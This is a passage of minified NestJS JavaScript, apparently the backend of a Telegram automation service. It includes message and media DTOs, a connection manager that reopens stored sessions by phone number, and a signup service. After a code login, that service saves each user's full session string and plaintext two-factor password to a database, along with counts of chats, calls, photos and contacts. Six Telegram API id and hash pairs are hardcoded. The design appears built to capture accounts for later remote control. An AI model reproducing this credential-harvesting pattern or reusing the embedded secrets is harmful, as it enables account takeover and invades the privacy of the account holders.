0)),o("design:type",String)],d.prototype,"endDate",void 0);class u extends l{}t.SendMediaDto=u,n([(0,a.ApiProperty)({description:"URL of the media file"}),(0,r.IsString)(),(0,r.IsUrl)(),o("design:type",String)],u.prototype,"url",void 0),n([(0,a.ApiProperty)({description:"Caption for the media",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],u.prototype,"caption",void 0),n([(0,a.ApiProperty)({description:"Filename for the media"}),(0,r.IsString)(),o("design:type",String)],u.prototype,"filename",void 0),n([(0,a.ApiProperty)({description:"Type of media",enum:c}),(0,r.IsEnum)(c),o("design:type",String)],u.prototype,"type",void 0);class m{}t.MediaAlbumItemDto=m,n([(0,a.ApiProperty)({description:"URL of the media file"}),(0,r.IsString)(),(0,r.IsUrl)(),o("design:type",String)],m.prototype,"url",void 0),n([(0,a.ApiProperty)({description:"Type of media",enum:c}),(0,r.IsEnum)(c),o("design:type",String)],m.prototype,"type",void 0),n([(0,a.ApiProperty)({description:"Caption for the media item",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],m.prototype,"caption",void 0);class g extends l{}t.SendMediaAlbumDto=g,n([(0,a.ApiProperty)({description:"Array of media items",type:[m]}),(0,r.IsArray)(),(0,r.ValidateNested)({each:!0}),(0,s.Type)((()=>m)),o("design:type",Array)],g.prototype,"media",void 0);class h extends l{}t.VoiceMessageDto=h,n([(0,a.ApiProperty)({description:"URL of the voice message file"}),(0,r.IsString)(),(0,r.IsUrl)(),o("design:type",String)],h.prototype,"url",void 0),n([(0,a.ApiProperty)({description:"Duration of voice message in seconds",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],h.prototype,"duration",void 0),n([(0,a.ApiProperty)({description:"Caption for the voice message",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],h.prototype,"caption",void 0)},4882:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.MessageSearchDto=t.MessageType=void 0;const r=i(7403),a=i(9742);var s;!function(e){e.ALL="all",e.TEXT="text",e.PHOTO="photo",e.VIDEO="video",e.VOICE="voice",e.DOCUMENT="document"}(s||(t.MessageType=s={}));class c{constructor(){this.limit=20}}t.MessageSearchDto=c,n([(0,a.ApiProperty)({description:"Chat ID to search in"}),(0,r.IsString)(),o("design:type",String)],c.prototype,"chatId",void 0),n([(0,a.ApiProperty)({description:"Text to search for",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],c.prototype,"query",void 0),n([(0,a.ApiProperty)({description:"Types of messages to include",enum:s,isArray:!0,required:!1}),(0,r.IsOptional)(),(0,r.IsArray)(),(0,r.IsEnum)(s,{each:!0}),o("design:type",Array)],c.prototype,"types",void 0),n([(0,a.ApiProperty)({description:"Offset for pagination",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],c.prototype,"offset",void 0),n([(0,a.ApiProperty)({description:"Limit for pagination",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],c.prototype,"limit",void 0)},2354:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BulkMessageOperationDto=t.DialogsQueryDto=t.MediaMetadataDto=t.MetadataType=void 0;const r=i(7403),a=i(9742),s=i(4922);var c;!function(e){e.PHOTO="photo",e.VIDEO="video",e.DOCUMENT="document"}(c||(t.MetadataType=c={}));class l{constructor(){this.limit=50}}t.MediaMetadataDto=l,n([(0,a.ApiProperty)({description:"Chat ID to get metadata from"}),(0,r.IsString)(),o("design:type",String)],l.prototype,"chatId",void 0),n([(0,a.ApiProperty)({description:"Message offset",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],l.prototype,"offset",void 0),n([(0,a.ApiProperty)({description:"Maximum number of items",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],l.prototype,"limit",void 0);class p{constructor(){this.limit=100,this.offsetId=0,this.archived=!1}}t.DialogsQueryDto=p,n([(0,a.ApiPropertyOptional)({description:"Number of dialogs to fetch",required:!1,type:Number,minimum:1,maximum:1e3}),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>parseInt(e))),(0,r.IsNumber)(),(0,r.Min)(1),(0,r.Max)(1e3),o("design:type",Number)],p.prototype,"limit",void 0),n([(0,a.ApiPropertyOptional)({description:"Dialog offset",required:!1,type:Number,minimum:0}),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>parseInt(e))),(0,r.IsNumber)(),(0,r.Min)(0),o("design:type",Number)],p.prototype,"offsetId",void 0),n([(0,a.ApiPropertyOptional)({description:"Include archived chats",required:!1,type:Boolean}),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>"true"===e||"false"!==e&&e)),(0,r.IsBoolean)(),o("design:type",Boolean)],p.prototype,"archived",void 0);class d{}t.BulkMessageOperationDto=d,n([(0,a.ApiProperty)({description:"Source chat ID",type:String,minLength:1,maxLength:255}),(0,r.IsString)(),o("design:type",String)],d.prototype,"fromChatId",void 0),n([(0,a.ApiProperty)({description:"Target chat ID",type:String,minLength:1,maxLength:255}),(0,r.IsString)(),o("design:type",String)],d.prototype,"toChatId",void 0),n([(0,a.ApiProperty)({description:"Message IDs to operate on",type:[Number],minItems:1,maxItems:100}),(0,s.Transform)((({value:e})=>Array.isArray(e)?e.map(Number):e)),o("design:type",Array)],d.prototype,"messageIds",void 0)},3429:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ProfilePhotoDto=t.SecuritySettingsDto=t.PrivacySettingsDto=t.UpdateProfileDto=void 0;const r=i(7403),a=i(9742),s=i(3538);class c{}t.UpdateProfileDto=c,n([(0,a.ApiProperty)({description:"First name"}),(0,r.IsString)(),o("design:type",String)],c.prototype,"firstName",void 0),n([(0,a.ApiProperty)({description:"About/bio information",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],c.prototype,"about",void 0);class l{}t.PrivacySettingsDto=l,n([(0,a.ApiProperty)({description:"Phone number visibility",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"phoneNumber",void 0),n([(0,a.ApiProperty)({description:"Last seen visibility",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"lastSeen",void 0),n([(0,a.ApiProperty)({description:"Profile photos visibility",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"profilePhotos",void 0),n([(0,a.ApiProperty)({description:"Message forwards visibility",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"forwards",void 0),n([(0,a.ApiProperty)({description:"Calls privacy",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"calls",void 0),n([(0,a.ApiProperty)({description:"Group chats privacy",enum:s.PrivacyLevelEnum,required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)(s.PrivacyLevelEnum),o("design:type",String)],l.prototype,"groups",void 0);class p{}t.SecuritySettingsDto=p,n([(0,a.ApiProperty)({description:"Enable/disable two-factor authentication"}),(0,r.IsBoolean)(),o("design:type",Boolean)],p.prototype,"twoFactorAuth",void 0),n([(0,a.ApiProperty)({description:"Active sessions limit",required:!1}),(0,r.IsOptional)(),(0,r.IsEnum)([1,2,3,4,5]),o("design:type",Number)],p.prototype,"activeSessionsLimit",void 0);class d{}t.ProfilePhotoDto=d,n([(0,a.ApiProperty)({description:"Name/identifier of the photo to set"}),(0,r.IsString)(),o("design:type",String)],d.prototype,"name",void 0)},3426:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BatchProcessItemDto=t.RescheduleMessageDto=t.DeleteScheduledMessageDto=t.GetScheduledMessagesDto=t.ScheduleMessageDto=void 0;const r=i(7403),a=i(9742),s=i(4922),c=i(6405);class l extends c.BaseBatchItemDto{}t.ScheduleMessageDto=l,n([(0,a.ApiProperty)({description:"Message content"}),(0,r.IsString)(),o("design:type",String)],l.prototype,"message",void 0),n([(0,a.ApiProperty)({description:"Date to schedule the message"}),(0,r.IsDateString)(),(0,s.Transform)((({value:e})=>new Date(e))),o("design:type",String)],l.prototype,"scheduledTime",void 0),n([(0,a.ApiProperty)({description:"Message to reply to",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],l.prototype,"replyTo",void 0),n([(0,a.ApiProperty)({description:"Silent notification",required:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"silent",void 0);class p extends c.BaseBatchItemDto{constructor(){super(...arguments),this.limit=50}}t.GetScheduledMessagesDto=p,n([(0,a.ApiProperty)({description:"Maximum number of messages to return",required:!1,default:50}),(0,r.IsOptional)(),(0,r.IsNumber)(),(0,s.Transform)((({value:e})=>parseInt(e))),o("design:type",Number)],p.prototype,"limit",void 0);class d extends c.BaseBatchItemDto{}t.DeleteScheduledMessageDto=d,n([(0,a.ApiProperty)({description:"ID of the scheduled message to delete"}),(0,r.IsNumber)(),o("design:type",Number)],d.prototype,"messageId",void 0);class u{}t.RescheduleMessageDto=u,n([(0,a.ApiProperty)({description:"Chat ID containing the message"}),(0,r.IsString)(),o("design:type",String)],u.prototype,"chatId",void 0),n([(0,a.ApiProperty)({description:"Message ID to reschedule"}),(0,r.IsNumber)(),o("design:type",Number)],u.prototype,"messageId",void 0),n([(0,a.ApiProperty)({description:"New schedule date (ISO string)"}),(0,r.IsDateString)(),o("design:type",String)],u.prototype,"newScheduleDate",void 0);class m{}t.BatchProcessItemDto=m,n([(0,a.ApiProperty)({description:"Chat ID or message ID depending on operation"}),(0,r.IsString)(),o("design:type",String)],m.prototype,"chatId",void 0),n([(0,a.ApiProperty)({description:"Message ID for operations that require it",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],m.prototype,"messageId",void 0)},7144:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ViewOnceMediaDto=t.MediaSourceType=void 0;const r=i(9742),a=i(7403);var s;!function(e){e.PATH="path",e.BASE64="base64",e.BINARY="binary"}(s||(t.MediaSourceType=s={}));class c{}t.ViewOnceMediaDto=c,n([(0,r.ApiProperty)({description:"Chat ID to send the view once media to",example:"123456789"}),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],c.prototype,"chatId",void 0),n([(0,r.ApiProperty)({description:"Source type of the media: url, base64, or binary",enum:s,example:"url"}),(0,a.IsEnum)(s),(0,a.IsNotEmpty)(),o("design:type",String)],c.prototype,"sourceType",void 0),n([(0,r.ApiProperty)({description:"URL of the media file (when sourceType is url)",required:!1,example:"https://example.com/image.jpg"}),(0,a.ValidateIf)((e=>e.sourceType===s.PATH)),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],c.prototype,"path",void 0),n([(0,r.ApiProperty)({description:"Base64 encoded media data (when sourceType is base64)",required:!1,example:"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD..."}),(0,a.ValidateIf)((e=>e.sourceType===s.BASE64)),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],c.prototype,"base64Data",void 0),n([(0,r.ApiProperty)({description:"Binary media data (when sourceType is binary)",required:!1,type:"string",format:"binary"}),(0,a.ValidateIf)((e=>e.sourceType===s.BINARY)),o("design:type",Object)],c.prototype,"binaryData",void 0),n([(0,r.ApiProperty)({description:"Optional caption for the media",required:!1,example:"Check this out! It will disappear after viewing"}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],c.prototype,"caption",void 0),n([(0,r.ApiProperty)({description:"Optional filename for the media",required:!1,example:"secret_image.jpg"}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],c.prototype,"filename",void 0)},3653:function(e,t,i){var n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.connectionManager=void 0;const o=n(i(1067)),r=i(3235),a=i(1273),s=i(3563),c=i(6185);class l{constructor(){this.cleanupInterval=null,this.clients=new Map,this.logger=a.TelegramLogger.getInstance()}setUsersService(e){this.usersService=e}static getInstance(){return l.instance||(l.instance=new l),l.instance}async cleanupInactiveConnections(e=18e4){const t=Date.now();for(const[i,n]of this.clients.entries())n.autoDisconnect&&t-n.lastUsed>e&&(this.logger.logOperation(i,"Releasing inactive connection"),await this.unregisterClient(i))}updateLastUsed(e){const t=this.clients.get(e);t&&(t.lastUsed=Date.now(),this.clients.set(e,t))}async getClient(e,t={}){if(!e)return void this.logger.logDebug("system","getClient called with empty mobile number");const{autoDisconnect:i=!0,handler:n=!0}=t;this.logger.logOperation(e,"Getting/Creating client",{autoDisconnect:i,handler:n});const a=this.clients.get(e);if(a?.client){if(this.updateLastUsed(e),a.client.connected())return this.logger.logOperation(e,"Reusing existing connected client"),a.client;try{return this.logger.logOperation(e,"Reconnecting existing client"),await a.client.connect(),a.client}catch(t){this.logger.logError(e,"Failed to reconnect client",t),await this.unregisterClient(e)}}if(!this.usersService)throw new Error("UsersService not initialized");const l=(await this.usersService.search({mobile:e}))[0];if(!l)throw new s.BadRequestException("user not found");const p=new o.default(l.session,l.mobile);let d;try{if(d=await p.createClient(n),await d.getMe(),d)return await this.registerClient(e,p,{autoDisconnect:i}),this.logger.logOperation(e,"Client created successfully"),p;throw new s.BadRequestException("Client Expired")}catch(t){this.logger.logError(e,"Client creation failed",t),this.logger.logDebug(e,"Parsing error details..."),await this.unregisterClient(e);const i=(0,r.parseError)(t,e);throw(0,c.contains)(i.message.toLowerCase(),["expired","unregistered","deactivated","revoked","user_deactivated_ban"])&&(this.logger.logOperation(e,"Marking user as expired"),await this.usersService.updateByFilter({$or:[{tgId:l.tgId},{mobile:e}]},{expired:!0})),new s.BadRequestException(i.message)}}hasClient(e){return this.clients.has(e)}async disconnectAll(){this.logger.logOperation("system","Disconnecting all clients");const e=Array.from(this.clients.keys());await Promise.all(e.map((e=>(this.logger.logOperation(e,"Disconnecting client"),this.unregisterClient(e))))),this.clients.clear(),this.logger.logOperation("system","All clients disconnected")}async registerClient(e,t,i={autoDisconnect:!0}){this.clients.set(e,{client:t,lastUsed:Date.now(),autoDisconnect:i.autoDisconnect}),this.logger.logOperation(e,"Client registered successfully"+(i.autoDisconnect?"":" (excluded from auto-cleanup)"))}async unregisterClient(e){try{const t=this.clients.get(e);t?(await(t.client?.disconnect()),this.logger.logOperation(e,"Client unregistered successfully")):this.logger.logError(e,"Client not found for unregistration",new Error("Client not found"))}catch(t){this.logger.logError(e,"Error in unregisterClient",t)}finally{this.clients.delete(e)}}getActiveConnectionCount(){return this.clients.size}startCleanupInterval(e=3e5){return this.cleanupInterval=setInterval((()=>{this.cleanupInactiveConnections().catch((e=>{this.logger.logError("system","Error in cleanup interval",e)}))}),e),this.cleanupInterval}stopCleanupInterval(){this.cleanupInterval&&(clearInterval(this.cleanupInterval),this.cleanupInterval=null)}}t.connectionManager=l.getInstance()},1273:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramLogger=void 0;const n=i(3563);class o{constructor(){this.logger=new n.Logger("TelegramService")}static getInstance(){return o.instance||(o.instance=new o),o.instance}logOperation(e,t,i){this.logger.log(`[${e}] ${t} - ${JSON.stringify(i||{})}`)}logError(e,t,i){this.logger.error(`[${e}] ${t} failed - ${i.message}`,i.stack)}logWarning(e,t,i){this.logger.warn(`[${e}] ${t} - ${JSON.stringify(i||{})}`)}logDebug(e,t,i){this.logger.debug(`[${e}] ${t} - ${JSON.stringify(i||{})}`)}}t.TelegramLogger=o},886:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupModule=void 0;const o=i(3563),r=i(7814),a=i(7422),s=i(2431);let c=class{};t.TgSignupModule=c,t.TgSignupModule=c=n([(0,o.Module)({imports:[(0,o.forwardRef)((()=>a.UsersModule))],controllers:[r.TgSignupController],providers:[s.TgSignupService],exports:[s.TgSignupService]})],c)},2431:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupService=void 0;const a=i(3563),s=i(3820),c=i(3047),l=i(689),p=i(5651),d=i(9425),u=i(9127),m=i(3235);let g=n=class{constructor(e){this.usersService=e,this.logger=new a.Logger(n.name),this.cleanupInterval=setInterval((()=>this.cleanupStaleSessions()),n.SESSION_CLEANUP_INTERVAL)}async onModuleDestroy(){clearInterval(this.cleanupInterval);const e=Array.from(n.activeClients.keys());await Promise.all(e.map((e=>this.disconnectClient(e))))}getRandomCredentials(){const e=Math.floor(Math.random()*n.API_CREDENTIALS.length);return n.API_CREDENTIALS[e]}async cleanupStaleSessions(){for(const[e,t]of n.activeClients)try{!(Date.now()-t.createdAt>n.LOGIN_TIMEOUT)||t.client&&t.client.connected||await this.disconnectClient(e)}catch(t){this.logger.warn(`Error cleaning up session for ${e}: ${t.message}`)}}validatePhoneNumber(e){if(e=e.replace(/^\+/,""),!/^\d{8,15}$/.test(e))throw new a.BadRequestException("Please enter a valid phone number");return e}async disconnectClient(e){const t=n.activeClients.get(e);if(t)try{clearTimeout(t.timeoutId),t.client?.connected&&await t.client.disconnect(),t.client&&await t.client.destroy()}catch(t){this.logger.warn(`Error disconnecting client for ${e}: ${t.message}`)}finally{n.activeClients.delete(e)}}async sendCode(e){try{e=this.validatePhoneNumber(e);const t=n.activeClients.get(e);t&&t.client?.connected&&await this.disconnectClient(e);const{apiId:i,apiHash:o}=this.getRandomCredentials(),r=new l.StringSession(""),d=new c.TelegramClient(r,i,o,{connectionRetries:5,retryDelay:2e3,useWSS:!0,timeout:3e4});await d.setLogLevel(p.LogLevel.ERROR),await d.connect();const u=await d.invoke(new s.Api.auth.SendCode({phoneNumber:e,apiId:i,apiHash:o,settings:new s.Api.CodeSettings({currentNumber:!0,allowAppHash:!0})}));if(u instanceof s.Api.auth.SentCodeSuccess)throw this.logger.error(`Unexpected immediate login for ${e}`),new a.BadRequestException("Unexpected immediate login");const m=setTimeout((()=>this.disconnectClient(e)),n.LOGIN_TIMEOUT);return n.activeClients.set(e,{client:d,phoneCodeHash:u.phoneCodeHash,timeoutId:m,createdAt:Date.now()}),{phoneCodeHash:u.phoneCodeHash,isCodeViaApp:u.type instanceof s.Api.auth.SentCodeTypeApp}}catch(t){if(this.logger.error(`Failed to send code to ${e}: ${t.message}`,t.stack),await this.disconnectClient(e),t.errorMessage?.includes("PHONE_NUMBER_BANNED"))throw new a.BadRequestException("This phone number has been banned from Telegram");if(t.errorMessage?.includes("PHONE_NUMBER_INVALID"))throw new a.BadRequestException("Please enter a valid phone number");if(t.errorMessage?.includes("FLOOD_WAIT"))throw new a.BadRequestException("Please wait a few minutes before trying again");throw new a.BadRequestException("Unable to send OTP. Please try again")}}async verifyCode(e,t,i){try{e=this.validatePhoneNumber(e);const o=n.activeClients.get(e);if(!o)throw this.logger.warn(`No active signup session found for ${e}`),new a.BadRequestException("Session Expired. Please start again");if(clearTimeout(o.timeoutId),o.timeoutId=setTimeout((()=>this.disconnectClient(e)),n.LOGIN_TIMEOUT),!o.client?.connected)try{await(o.client?.connect())}catch(t){this.logger.warn(`Connection lost for ${e}, attempting to reconnect`);try{const{apiId:e,apiHash:t}=this.getRandomCredentials(),i=new l.StringSession(""),n=new c.TelegramClient(i,e,t,{connectionRetries:5,retryDelay:2e3,useWSS:!0,timeout:3e4});await n.connect(),o.client=n}catch(e){throw new a.BadRequestException("Connection failed. Please try verifying again.")}}const{client:r,phoneCodeHash:p}=o;try{this.logger.debug(`Attempting to sign in with code for ${e}`);const n=await r.invoke(new s.Api.auth.SignIn({phoneNumber:e,phoneCodeHash:p,phoneCode:t}));if(!n)throw new a.BadRequestException("Invalid response from Telegram server");if(n instanceof s.Api.auth.AuthorizationSignUpRequired){this.logger.log(`New user registration required for ${e}`);const t=await this.handleNewUserRegistration(e,r,p);return await this.disconnectClient(e),t}const o=r.session.save();if(!o)throw new Error("Failed to generate session string");const c=await this.processLoginResult(n.user,o,i);return await this.disconnectClient(e),c}catch(t){if("SESSION_PASSWORD_NEEDED"===t.errorMessage)return this.logger.warn(`2FA required for ${e}`),i?await this.handle2FALogin(e,o.client,i):{status:400,message:"Two-factor authentication required",requires2FA:!0};if(t.errorMessage?.includes("PHONE_CODE_INVALID")||t.errorMessage?.includes("PHONE_CODE_EXPIRED"))throw new a.BadRequestException("Invalid OTP,  Try again!");throw this.logger.warn(`Verification attempt failed for ${e}: ${t.message}`),new a.BadRequestException("Verification failed. Please try again.")}}catch(t){throw this.logger.error(`Verification error for ${e}: ${t.message}`),(t.message?.includes("No active signup session")||t.message?.includes("Connection failed"))&&await this.disconnectClient(e),t instanceof a.BadRequestException?t:new a.BadRequestException(t.message||"Verification failed, please try again")}}async handle2FALogin(e,t,i){try{this.logger.debug(`Fetching password SRP parameters for ${e}`);const n=await t.invoke(new s.Api.account.GetPassword);this.logger.debug(`Computing password check for ${e}`);const o=await(0,d.computeCheck)(n,i);this.logger.debug(`Invoking CheckPassword API for ${e}`);const r=await t.invoke(new s.Api.auth.CheckPassword({password:o}));if(!r||!r.user)throw new a.BadRequestException("Invalid response from Telegram server");this.logger.log(`2FA login successful for ${e}`);const c=t.session.save();if(!c)throw new Error("Failed to generate session string");const l=await this.processLoginResult(r.user,c,i);return await this.disconnectClient(e),l}catch(t){if(this.logger.error(`2FA login failed for ${e}: ${t.message}`,t.stack),i)throw new a.BadRequestException("Incorrect 2FA password");throw new a.BadRequestException("2FA password required")}}async handleNewUserRegistration(e,t,i){try{const n=`User${Math.random().toString(36).substring(2,8)}`,o=await t.invoke(new s.Api.auth.SignUp({phoneNumber:e,phoneCodeHash:i,firstName:n,lastName:""}));if(!o||!o.user)throw new a.BadRequestException("Invalid response from Telegram server");const r=t.session.save();if(!r)throw new Error("Failed to generate session string");return await this.processLoginResult(o.user,r)}catch(e){const t=(0,m.parseError)(e,"TGSIGNUP",!1);throw this.logger.error(`Failed to register new user: ${t.message}`),new a.BadRequestException(t.message||"Failed to register new user")}}async processLoginResult(e,t,i){try{if(!e||!t)throw new Error("Invalid user data or session string");const n=new Date,o={mobile:e.phone?.toString()?.replace(/^\+/,"")||"",session:t,firstName:e.firstName||"",lastName:e.lastName||"",username:e.username||"",tgId:e.id?.toString()||"",twoFA:!!i,password:i||null,lastActive:n.toISOString().split("T")[0],expired:!1,channels:0,personalChats:0,totalChats:0,otherPhotoCount:0,ownPhotoCount:0,ownVideoCount:0,otherVideoCount:0,recentUsers:[],calls:{chatCallCounts:[],incoming:0,outgoing:0,totalCalls:0,video:0},contacts:0,movieCount:0,msgs:0,photoCount:0,videoCount:0,gender:"unknown"};if(!o.mobile||!o.tgId)throw new Error("Invalid user data received from Telegram");return await this.usersService.create(o),{status:200,message:"Registration successful",session:t}}catch(e){if(this.logger.error("Error processing login result:",e),e instanceof a.BadRequestException)throw e;throw new a.InternalServerErrorException("Failed to complete registration")}}};t.TgSignupService=g,g.LOGIN_TIMEOUT=3e5,g.SESSION_CLEANUP_INTERVAL=3e5,g.PHONE_PREFIX="+",g.activeClients=new Map,g.API_CREDENTIALS=[{apiId:27919939,apiHash:"5ed3834e741b57a560076a1d38d2fa94"},{apiId:25328268,apiHash:"b4e654dd2a051930d0a30bb2add80d09"},{apiId:12777557,apiHash:"05054fc7885dcfa18eb7432865ea3500"},{apiId:27565391,apiHash:"a3a0a2e895f893e2067dae111b20f2d9"},{apiId:27586636,apiHash:"f020539b6bb5b945186d39b3ff1dd998"},{apiId:29210552,apiHash:"f3dbae7e628b312c829e1bd341f1e9a9"}],t.TgSignupService=g=n=o([(0,a.Injectable)(),r("design:paramtypes",[u.UsersService])],g)},3318:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupResponse=t.VerifyCodeDto=t.SendCodeDto=void 0;const r=i(9742),a=i(4922),s=i(7403);class c{}t.SendCodeDto=c,n([(0,r.ApiProperty)({description:"Phone number to send the verification code to (international format)",example:"+919876543210"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\+\d{8,15}$/,{message:"Invalid phone number format"}),o("design:type",String)],c.prototype,"phone",void 0);class l{}t.VerifyCodeDto=l,n([(0,r.ApiProperty)({description:"Phone number used for verification (international format)",example:"919876543210"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\+\d{8,15}$/,{message:"Invalid phone number format"}),o("design:type",String)],l.prototype,"phone",void 0),n([(0,r.ApiProperty)({description:"Verification code received",example:"12345"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\d{5}$/,{message:"Code must be exactly 5 digits"}),o("design:type",String)],l.prototype,"code",void 0),n([(0,r.ApiProperty)({description:"Two-factor authentication password if required",example:"yourSecurePassword123",required:!1}),(0,s.IsString)(),(0,s.IsOptional)(),(0,a.Transform)((({value:e})=>""===e?void 0:e)),o("design:type",String)],l.prototype,"password",void 0);class p{}t.TgSignupResponse=p,n([(0,r.ApiProperty)({description:"Operation status code",example:200}),o("design:type",Number)],p.prototype,"status",void 0),n([(0,r.ApiProperty)({description:"Response message",example:"Login successful"}),o("design:type",String)],p.prototype,"message",void 0),n([(0,r.ApiProperty)({description:"Phone code hash for 